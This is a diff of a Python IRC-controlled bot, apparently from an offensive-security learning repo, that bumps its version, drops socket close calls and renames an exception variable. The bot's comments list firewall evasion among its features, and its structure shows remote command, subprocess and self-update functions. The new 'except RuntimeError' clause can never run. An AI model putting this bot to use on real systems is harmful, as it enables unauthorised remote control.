@@ -31,7 +31,7 @@ import skype
 #       status      returns the size of the worker's task queue
 #       openvpn     implement openvpn for firewall evasion
 
-version = "3.6"                                                   # bot version
+version = "3.7"                                                   # bot version
 
 ### Remove/comment this block to disable logging stdout/err to a file
 so = se = open("bot_v%s.log" % version, 'w', 0)
@@ -105,7 +105,6 @@ def sigterm_handler(signum, frame):                                           # 
     log('[#] ----Subprocess Spawned----')
     privmsg('----Subprocess Spawned----')
     irc.send ( 'QUIT\r\n' )
-    irc.close()
     raise SystemExit                                                
     sys.exit()
 
@@ -341,7 +340,6 @@ def selfupdate(git_user="nikisweeting",git_repo="violent-python"):   # updates t
             privmsg("[+] Shutting down for update. Log saved in updatelog.txt")
             quit_status = True
             irc.send ( 'QUIT\r\n' )
-            irc.close()
             raise SystemExit
             sys.exit()
 
@@ -492,8 +490,8 @@ if __name__ == '__main__':
                 irc.send ('JOIN %s\r\n' % channel)
                 broadcast('Bot v%s Running.' % version)
                 try:
-                    privmsg('Bot reloaded due to internal exception: %s' % e)
-                    del e
+                    privmsg('Bot reloaded due to internal exception: %s' % exit_exception)
+                    del exit_exception
                 except NameError:
                     pass
             except Exception as error:
@@ -545,7 +543,6 @@ if __name__ == '__main__':
                     elif content == '!quit' or content == 'quit':
                         privmsg('Quitting.')
                         irc.send('QUIT\r\n')
-                        irc.close()
                         quit_status = True
 
                     elif content == '!reconnect' or content == 'reconnect':
@@ -563,8 +560,7 @@ if __name__ == '__main__':
                         log('[#] ----New Process Spawned----')
                         privmsg('----New Process Spawned----')
                         quit_status = True
-                        irc.send ( 'QUIT\r\n' )
-                        irc.close()
+                        irc.send('QUIT\r\n')
                         raise SystemExit                                              
                         sys.exit()
 
@@ -689,9 +685,11 @@ if __name__ == '__main__':
 
         except (KeyboardInterrupt, SystemExit):
             break
-        except Exception as e:
-            log("[#] ----EXCEPTION---- ",e)
+        except Exception as exit_exception:
+            log("[#] ----EXCEPTION---- ",exit_exception)
+        except RuntimeError as exit_exception:
+            log("[#] ----EXCEPTION---- ",exit_exception)
+            
         log("[*] EXIT")
         raise SystemExit
         sys.exit()
-        
